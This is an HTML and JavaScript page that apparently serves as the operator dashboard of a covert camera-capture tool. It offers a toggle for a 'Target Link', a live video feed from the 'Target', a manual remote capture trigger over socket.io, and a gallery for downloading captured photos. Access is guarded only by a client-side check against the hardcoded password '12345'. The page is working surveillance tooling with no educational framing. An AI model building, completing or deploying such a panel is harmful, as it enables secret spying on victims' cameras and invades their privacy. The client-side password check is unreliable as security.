<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Admin Dashboard & Controls</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #181818;
            color: #ffffff;
            display: flex;
            flex-direction: column;
            align-items: center;
            padding: 20px;
            margin: 0;
        }
        .container {
            background: #282828;
            padding: 25px;
            border-radius: 12px;
            text-align: center;
            width: 90%;
            max-width: 650px;
            box-shadow: 0 4px 15px rgba(0,0,0,0.5);
        }
        #loginOverlay {
            position: fixed;
            top: 0; left: 0; width: 100%; height: 100%;
            background: #121212;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            z-index: 1000;
        }
        input[type="password"] {
            padding: 12px;
            font-size: 16px;
            border-radius: 6px;
            border: 1px solid #444;
            margin-bottom: 12px;
            width: 200px;
            text-align: center;
        }
        button {
            background-color: #00e676;
            color: #000;
            border: none;
            padding: 10px 18px;
            font-size: 14px;
            font-weight: bold;
            border-radius: 6px;
            cursor: pointer;
        }
        .controls-row {
            display: flex;
            justify-content: space-between;
            align-items: center;
            background: #1e1e1e;
            padding: 12px 18px;
            border-radius: 8px;
            margin-bottom: 15px;
            border: 1px solid #444;
        }
        .live-stream-box {
            margin: 15px 0;
            background: #111;
            border: 2px solid #00e676;
            border-radius: 8px;
            padding: 10px;
        }
        .live-stream-box img {
            width: 100%;
            max-width: 380px;
            border-radius: 6px;
        }
        .gallery {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(160px, 1fr));
            gap: 15px;
            margin-top: 20px;
            max-height: 400px;
            overflow-y: auto;
            padding: 10px;
            border: 1px solid #444;
            border-radius: 8px;
        }
        .card {
            background: #333;
            padding: 8px;
            border-radius: 8px;
            display: flex;
            flex-direction: column;
            align-items: center;
        }
        .card img {
            width: 100%;
            border-radius: 4px;
        }
        .action-btns {
            display: flex;
            gap: 6px;
            margin-top: 8px;
        }
        .btn-download {
            background-color: #0288d1;
            color: white;
            text-decoration: none;
            padding: 5px 10px;
            font-size: 12px;
            border-radius: 4px;
        }
        .btn-delete {
            background-color: #d32f2f;
            color: white;
            border: none;
            padding: 5px 10px;
            font-size: 12px;
            border-radius: 4px;
            cursor: pointer;
        }
    </style>
</head>
<body>

    <!-- Lock Screen -->
    <div id="loginOverlay">
        <h2>🔒 Admin Access Restricted</h2>
        <input type="password" id="passInput" placeholder="Enter Password">
        <button onclick="login()">LOGIN</button>
        <p id="errMsg" style="color: #ff5252; display: none; margin-top: 10px;">Incorrect Password!</p>
    </div>

    <!-- Dashboard -->
    <div class="container">
        <h2>👑 Admin Control Panel</h2>

        <!-- Link ON/OFF Toggle Control -->
        <div class="controls-row">
            <span>Target Link Status:</span>
            <button id="linkToggleBtn" onclick="toggleLinkState()" style="background-color: #2e7d32; color: white;">ACTIVE (ON)</button>
        </div>

        <!-- Live Camera Stream -->
        <h3>🔴 Live Video Feed:</h3>
        <div class="live-stream-box">
            <img id="liveFeedImg" src="" alt="Waiting for live stream..." style="display:none;">
            <p id="streamStatus" style="color: #888;">Target is offline</p>
        </div>

        <div style="margin-bottom: 10px;">
            <button onclick="triggerManualCapture()" style="background-color: #ff1744; color: white;">MANUAL CAPTURE NOW</button>
        </div>

        <h3>Captured Photos:</h3>
        <div class="gallery" id="photoGallery">
            <p id="emptyMsg" style="grid-column: 1/-1; color: #aaa;">No stored photos yet.</p>
        </div>
    </div>

    <script src="/socket.io/socket.io.js"></script>
    <script>
        const socket = io();
        let isLinkActive = true;

        function login() {
            const pass = document.getElementById('passInput').value;
            if (pass === '12345') {
                document.getElementById('loginOverlay').style.display = 'none';
                socket.emit('admin-auth-success');
            } else {
                document.getElementById('errMsg').style.display = 'block';
            }
        }

        function toggleLinkState() {
            isLinkActive = !isLinkActive;
            const btn = document.getElementById('linkToggleBtn');
            if (isLinkActive) {
                btn.innerText = "ACTIVE (ON)";
                btn.style.backgroundColor = "#2e7d32";
            } else {
                btn.innerText = "DISABLED (OFF)";
                btn.style.backgroundColor = "#c62828";
            }
            socket.emit('admin-toggle-link', isLinkActive);
        }

        function triggerManualCapture() {
            socket.emit('admin-trigger-capture');
        }

        function deletePhoto(fileName, elementId) {
            socket.emit('delete-photo', fileName);
            const cardElem = document.getElementById(elementId);
            if (cardElem) cardElem.remove();
        }

        function renderPhotoCard(imageData, fileName) {
            const emptyMsg = document.getElementById('emptyMsg');
            if (emptyMsg) emptyMsg.style.display = 'none';

            const cardId = `card_${fileName.replace(/[^a-zA-Z0-9]/g, '')}`;
            if (document.getElementById(cardId)) return;

            const gallery = document.getElementById('photoGallery');
            const card = document.createElement('div');
            card.className = 'card';
            card.id = cardId;

            const img = document.createElement('img');
            img.src = imageData;

            const btnBox = document.createElement('div');
            btnBox.className = 'action-btns';

            const downBtn = document.createElement('a');
            downBtn.className = 'btn-download';
            downBtn.href = imageData;
            downBtn.download = fileName;
            downBtn.innerText = '💾 Download';

            const delBtn = document.createElement('button');
            delBtn.className = 'btn-delete';
            delBtn.innerText = '🗑️ Delete';
            delBtn.onclick = () => deletePhoto(fileName, cardId);

            btnBox.appendChild(downBtn);
            btnBox.appendChild(delBtn);

            card.appendChild(img);
            card.appendChild(btnBox);
            gallery.insertBefore(card, gallery.firstChild);
        }

        socket.on('update-live-stream', (frameData) => {
            const liveImg = document.getElementById('liveFeedImg');
            const status = document.getElementById('streamStatus');
            liveImg.src = frameData;
            liveImg.style.display = 'inline-block';
            status.style.display = 'none';
        });

        socket.on('load-stored-photos', (photosArray) => {
            photosArray.forEach(item => renderPhotoCard(item.imageData, item.fileName));
        });

        socket.on('send-photo-to-admin', (data) => {
            renderPhotoCard(data.imageData, data.fileName);
        });
    </script>
</body>
</html>
